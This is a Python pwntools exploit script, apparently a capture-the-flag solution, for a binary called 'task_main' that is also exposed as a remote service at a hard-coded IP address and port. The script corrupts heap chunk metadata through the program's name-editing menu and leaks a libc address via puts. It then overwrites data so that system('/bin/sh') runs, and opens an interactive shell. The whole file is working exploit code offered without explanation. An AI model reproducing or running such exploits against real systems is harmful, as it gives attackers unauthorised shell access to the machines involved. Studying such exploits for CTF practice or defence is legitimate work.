#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

r = None

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def exploit(host):
    global r
    BINARY = './task_main'
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

    if args.R:
         r = remote(host, port=30969)
    else:
         r = process(BINARY, env={'LD_PRELOAD':LIBC64})

    #attach(0x0D8B )
    r.sendlineafter("Choice >> ", '1')
    r.sendlineafter("The length of my owner's name:", "32")
    r.sendlineafter("Give me my owner's name:", "a"*20)

    r.sendlineafter("Choice >> ", '1')
    r.sendlineafter("The length of my owner's name:", "32")
    r.sendlineafter("Give me my owner's name:", "a"*20)

    r.sendlineafter("Choice >> ", '3')
    r.sendlineafter("owner's name?", '0')
    p = '\x00'*0x20
    p += p64(0)
    p += p64(0x21)
    p += "\x68"
    r.sendlineafter("The length of my owner's name:", str(len(p)+1))
    r.sendafter("Give me my owner's name:", p)

    #attach(0xd8b)
    r.sendlineafter("Choice >> ", '2')
    r.sendline('1')
    libc = ELF(LIBC64)
    r.recvuntil('my owner!\n')
    libc.address = u64(r.recv(6) + '\x00\x00') - libc.sym['puts']
    print "%#x"  % libc.address

    r.sendlineafter("Choice >> ", '3')
    r.sendlineafter("owner's name?", '0')
    p = '\x00'*0x20
    p += p64(0)
    p += p64(0x21)
    p += p64(libc.search('/bin/sh\x00').next())
    p += p64(libc.sym['system'])
    r.sendlineafter("The length of my owner's name:", str(len(p)+1))
    r.sendafter("Give me my owner's name:", p)


if __name__ == '__main__':
    host = '117.78.39.172'
    exploit(host)
    r.interactive()

